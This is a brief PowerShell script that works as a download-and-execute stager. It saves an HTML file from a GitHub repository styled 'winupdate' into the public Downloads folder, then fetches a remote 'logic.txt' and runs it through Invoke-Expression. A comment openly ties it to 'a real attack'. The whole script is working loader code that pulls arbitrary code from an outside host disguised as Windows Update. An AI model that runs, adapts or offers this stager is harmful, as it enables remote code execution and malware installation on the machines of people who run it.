$blobPath = "C:\Users\Public\Downloads\test.html"
$blobUrl = "https://github.com/gwyn1869/winupdate/blob/main/test.html"
$logicUrl = "https://github.com/gwyn1869/winupdate/blob/main/logic.txt"

# 1. Save the .html file using specified parameters
Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $blobUrl -OutFile $blobPath

# 2. Retrieve and run the logic script
# In a real attack, this downloads the text from $logicUrl and pipes it to IEX
$remoteLogic = (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $logicUrl).Content
Invoke-Expression -Command $remoteLogic
